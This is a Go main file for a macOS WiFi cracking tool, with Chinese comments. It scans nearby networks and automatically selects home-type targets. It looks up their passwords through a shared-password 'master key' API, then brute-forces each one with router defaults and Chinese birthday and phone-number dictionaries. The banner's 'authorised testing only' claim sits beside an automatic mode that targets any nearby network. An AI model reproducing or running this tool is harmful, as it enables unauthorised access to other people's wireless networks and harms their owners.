package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"time"
	"wifi-crack/internal/cracker"
	"wifi-crack/internal/dict"
	"wifi-crack/internal/masterkey"
	"wifi-crack/internal/scanner"
)

// ============================================================
// 版本信息
// ============================================================
const (
	version = "2.0.0"
	banner  = `
  ╔══════════════════════════════════════════════╗
  ║   WiFi Cracker v%s (Go + CoreWLAN)        ║
  ║   万能钥匙预查 + 智能字典爆破              ║
  ║   macOS 专用 · 仅限授权安全测试            ║
  ╚══════════════════════════════════════════════╝
`
)

func main() {
	// ============================================================
	// 命令行参数定义
	// ============================================================
	target := flag.String("t", "", "指定目标SSID（不指定则自动扫描）")
	dictFile := flag.String("d", "", "额外字典文件路径")
	delay := flag.Int("delay", 200, "每次尝试间隔（毫秒）")
	scanOnly := flag.Bool("scan", false, "仅扫描，不爆破")
	verbose := flag.Bool("v", true, "显示详细日志")
	showVersion := flag.Bool("version", false, "显示版本")
	flag.Parse()

	// 版本信息
	if *showVersion {
		fmt.Printf("wifi-crack v%s\n", version)
		return
	}

	fmt.Printf(banner, version)

	// ============================================================
	// 阶段0：位置权限检查
	// ============================================================
	locStatus := scanner.LocationStatus()
	fmt.Printf("  [0/3] 位置权限: %s\n", locStatus)
	if locStatus != "已授权" {
		fmt.Println("  [!] 位置权限未授予，SSID可能不可见")
		fmt.Println("  [!] 请前往: 系统设置 > 隐私与安全 > 定位服务 > 授权终端")
		fmt.Println("  [!] 或运行: sudo /usr/bin/python3 -c \"import CoreLocation\"")
		fmt.Println()
	}

	// ============================================================
	// 阶段1：扫描WiFi
	// ============================================================
	fmt.Println("  [1/3] 扫描附近WiFi网络...")

	nets, err := scanner.ScanWiFi()
	if err != nil {
		fmt.Fprintf(os.Stderr, "  [!] 扫描失败: %v\n", err)
		fmt.Fprintln(os.Stderr, "  [!] 提示: 需要在终端中授予位置权限")
		os.Exit(1)
	}

	if len(nets) == 0 {
		fmt.Fprintln(os.Stderr, "  [!] 未扫描到WiFi网络")
		fmt.Fprintln(os.Stderr, "  [!] 可能原因: 位置权限未授予，请检查 系统设置 > 隐私与安全 > 定位服务")
		os.Exit(1)
	}

	fmt.Printf("  [+] 扫描到 %d 个WiFi网络\n", len(nets))

	// ============================================================
	// 阶段2：过滤目标
	// ============================================================
	fmt.Println("  [2/3] 过滤目标（排除校园网/Portal/企业网/开放网络）...")

	var targets []scanner.WiFiNetwork

	if *target != "" {
		// 指定目标模式：在扫描结果中查找
		for _, n := range nets {
			if n.SSID == *target {
				targets = append(targets, n)
				break
			}
		}
		if len(targets) == 0 {
			fmt.Fprintf(os.Stderr, "  [!] 未找到目标: %s\n", *target)
			os.Exit(1)
		}
	} else {
		// 自动模式：过滤+排序
		targets = scanner.FilterAndSort(nets)
	}

	// 打印目标列表
	fmt.Printf("\n  可爆破目标 (%d 个):\n", len(targets))
	fmt.Println("  ┌────┬──────────────────────────┬────────┬──────────┬─────┐")
	fmt.Println("  │ #  │ SSID                     │ 信号   │ 安全类型 │ 频道│")
	fmt.Println("  ├────┼──────────────────────────┼────────┼──────────┼─────┤")
	for i, n := range targets {
		fmt.Printf("  │ %-2d │ %-24s │ %4d   │ %-8s │ %-3d │\n",
			i+1, truncStr(n.SSID, 24), n.RSSI, n.Security, n.Channel)
	}
	fmt.Println("  └────┴──────────────────────────┴────────┴──────────┴─────┘")

	if len(targets) == 0 {
		fmt.Println("\n  [!] 没有可爆破的目标")
		return
	}

	// 仅扫描模式到此结束
	if *scanOnly {
		fmt.Println("\n  [*] 扫描完成（--scan 模式，不执行爆破）")
		return
	}

	// ============================================================
	// 阶段3：万能钥匙预查询（需要网络，必须在爆破前完成）
	// 注意：爆破会断开当前WiFi导致断网，所以查询必须先全部完成
	// ============================================================
	fmt.Println("\n  [3/5] 万能钥匙密码预查询（需联网）...")

	// 记录每个目标的万能钥匙查询结果
	masterKeyPwds := make(map[string]string) // SSID → 万能钥匙密码
	apiDown := false
	for i, t := range targets {
		if apiDown {
			break // API不可用，跳过剩余查询
		}
		if t.BSSID == "" {
			fmt.Printf("    [%d/%d] %-20s BSSID为空，跳过\n", i+1, len(targets), t.SSID)
			continue
		}
		fmt.Printf("    [%d/%d] %-20s 查询中...", i+1, len(targets), t.SSID)

		pwd, err := masterkey.Query(t.SSID, t.BSSID)
		if err != nil {
			fmt.Printf(" %v\n", err)
			// 检查API是否整体不可用
			if !masterkey.Available() {
				fmt.Println("    [!] 万能钥匙API不可用，跳过剩余查询（直接进入字典爆破）")
				apiDown = true
			}
			continue
		}

		if pwd != "" {
			fmt.Printf(" ✓ 命中! 密码=[%s]\n", pwd)
			masterKeyPwds[t.SSID] = pwd
		} else {
			fmt.Printf(" 未收录\n")
		}
	}

	if len(masterKeyPwds) > 0 {
		fmt.Printf("\n  [+] 万能钥匙命中 %d 个目标（稍后验证连接）\n", len(masterKeyPwds))
	} else if apiDown {
		fmt.Println("  [!] 万能钥匙服务暂不可用，将仅使用字典爆破")
	}

	// ============================================================
	// 阶段4：构建智能密码列表
	// 优先级：万能钥匙密码 → 路由器默认密码 → 中国定制字典 → 外部字典
	// ============================================================
	fmt.Println("\n  [4/5] 构建中国定制密码列表...")

	var allPasswords []string

	// 第0层：万能钥匙查到的密码（最高优先级，放最前面）
	for _, t := range targets {
		if pwd, ok := masterKeyPwds[t.SSID]; ok {
			allPasswords = append(allPasswords, pwd)
		}
	}

	// 第1层：路由器默认密码（针对每个目标SSID生成）
	for _, t := range targets {
		routerDefaults := cracker.GenerateRouterDefaults(t.SSID)
		allPasswords = append(allPasswords, routerDefaults...)
	}

	// 第2层：中国WiFi定制字典（含生日/手机号/重复模式等）
	allPasswords = append(allPasswords, dict.GenerateAllChinese()...)

	// 第3层：外部字典文件
	if *dictFile != "" {
		absPath, _ := filepath.Abs(*dictFile)
		extra, err := dict.LoadDictFile(absPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  [!] 字典文件加载失败: %v\n", err)
		} else {
			fmt.Printf("  [+] 外部字典: %s (%d 条)\n", absPath, len(extra))
			allPasswords = append(allPasswords, extra...)
		}
	}

	// 去重（保持优先级顺序）
	allPasswords = dict.MergeAndDedup(allPasswords)
	fmt.Printf("  [+] 密码总量: %d 条\n", len(allPasswords))

	// ============================================================
	// 阶段5：开始爆破（会断开当前WiFi）
	// 先记录原始WiFi，爆破完成后自动恢复
	// ============================================================
	originalSSID := scanner.CurrentSSID()
	if originalSSID != "" {
		fmt.Printf("\n  [!] 当前WiFi: %s（爆破完成后自动恢复）\n", originalSSID)
	}

	fmt.Println("\n  [5/5] 开始字典爆破...")

	cfg := cracker.CrackConfig{
		Delay:    time.Duration(*delay) * time.Millisecond,
		Verbose:  *verbose,
		MaxRetry: 1,
	}

	results := cracker.CrackAll(targets, allPasswords, cfg)

	// 统计结果
	successCount := 0
	for _, r := range results {
		if r.Success {
			successCount++
		}
	}

	// ============================================================
	// 爆破完成：恢复原始WiFi连接
	// ============================================================
	if originalSSID != "" {
		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
		if scanner.ReconnectWiFi(originalSSID) {
			fmt.Println(" ✓ 已恢复")
		} else {
			fmt.Println(" ✗ 恢复失败，请手动连接")
		}
	}

	if successCount > 0 {
		os.Exit(0)
	} else {
		os.Exit(1)
	}
}

// ============================================================
// truncStr 截断字符串（超长加省略号）
// ============================================================
func truncStr(s string, maxLen int) string {
	runes := []rune(s)
	if len(runes) <= maxLen {
		return s
	}
	return string(runes[:maxLen-1]) + "…"
}
